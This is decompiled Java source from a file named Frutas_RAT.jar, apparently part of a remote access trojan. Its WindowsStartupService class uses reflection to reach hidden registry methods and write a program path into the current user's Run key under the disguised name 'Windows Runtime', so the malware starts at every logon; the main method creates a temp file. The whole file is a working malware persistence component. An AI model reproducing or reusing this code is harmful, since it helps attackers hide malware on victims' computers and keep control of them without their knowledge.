/*    */ import java.io.ByteArrayOutputStream;
/*    */ import java.io.File;
/*    */ import java.io.IOException;
/*    */ import java.io.PrintStream;
/*    */ import java.lang.reflect.Field;
/*    */ import java.lang.reflect.Method;
/*    */ import java.lang.reflect.Modifier;
/*    */ import java.util.HashMap;
/*    */ import java.util.Map;
/*    */ import java.util.prefs.Preferences;
/*    */ 
/*    */ public class WindowsStartupService
/*    */ {
/* 15 */   private Preferences preferences = Preferences.userRoot();
/* 16 */   private Map<String, Field> consts = new HashMap();
/*    */   private Method openKey;
/*    */   private Method closeKey;
/*    */   private Method winRegSetValueEx;
/*    */ 
/*    */   protected WindowsStartupService()
/*    */   {
/* 23 */     loadRegistryData();
/*    */   }
/*    */ 
/*    */   private void loadRegistryData() {
/*    */     try {
/* 28 */       Class clz = this.preferences.getClass();
/*    */ 
/* 30 */       for (Method me : clz.getMethods()) {
/* 31 */         System.out.println(me.getName());
/*    */       }
/* 33 */       for (Field field : clz.getDeclaredFields())
/*    */       {
/* 36 */         int mod = field.getModifiers();
/* 37 */         if ((Modifier.isStatic(mod)) && (Modifier.isPrivate(mod)) && (Modifier.isFinal(mod))) {
/* 38 */           field.setAccessible(true);
/* 39 */           this.consts.put(field.getName(), field);
/*    */         }
/*    */       }
/*    */ 
/* 43 */       this.closeKey = clz.getDeclaredMethod("closeKey", new Class[] { Integer.TYPE });
/* 44 */       this.closeKey.setAccessible(true);
/* 45 */       this.winRegSetValueEx = clz.getDeclaredMethod("WindowsRegSetValueEx", new Class[] { Integer.TYPE, [B.class, [B.class });
/* 46 */       this.winRegSetValueEx.setAccessible(true);
/* 47 */       this.openKey = clz.getDeclaredMethod("openKey", new Class[] { Integer.TYPE, [B.class, Integer.TYPE, Integer.TYPE });
/* 48 */       this.openKey.setAccessible(true);
/*    */     } catch (Exception e) {
/* 50 */       e.printStackTrace();
/*    */     }
/*    */   }
/*    */ 
/*    */   private byte[] convertToAsciz(String str) {
/* 55 */     ByteArrayOutputStream output = new ByteArrayOutputStream();
/* 56 */     for (char c : str.toCharArray()) {
/* 57 */       output.write((byte)c);
/*    */     }
/* 59 */     output.write(0);
/* 60 */     return output.toByteArray();
/*    */   }
/*    */ 
/*    */   public void add(String toAdd)
/*    */   {
/*    */     try {
/* 66 */       Integer handle = (Integer)this.openKey.invoke(this.preferences, new Object[] { Integer.valueOf(((Field)this.consts.get("HKEY_CURRENT_USER")).getInt(null)), convertToAsciz("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), Integer.valueOf(((Field)this.consts.get("KEY_SET_VALUE")).getInt(null)), Integer.valueOf(((Field)this.consts.get("KEY_SET_VALUE")).getInt(null)) });
/*    */ 
/* 72 */       this.winRegSetValueEx.invoke(null, new Object[] { handle, convertToAsciz("Windows Runtime"), convertToAsciz(toAdd) });
/* 73 */       this.closeKey.invoke(this.preferences, new Object[] { handle });
/* 74 */       System.out.println(handle);
/*    */     } catch (Exception e) {
/* 76 */       e.printStackTrace();
/*    */     }
/*    */   }
/*    */ 
/*    */   public static void main(String[] args)
/*    */     throws IOException
/*    */   {
/* 85 */     String tmp = System.getenv("tmp");
/* 86 */     System.out.println(tmp);
/* 87 */     File ar = new File(tmp, "ruta.txt");
/*    */ 
/* 89 */     System.out.println(ar.exists());
/* 90 */     if (!ar.exists())
/* 91 */       ar.createNewFile();
/*    */   }
/*    */ }

/* Location:           C:\Users\Danilo\Desktop\Coisas\Frutas_RAT.jar
 * Qualified Name:     WindowsStartupService
 * JD-Core Version:    0.6.2
 */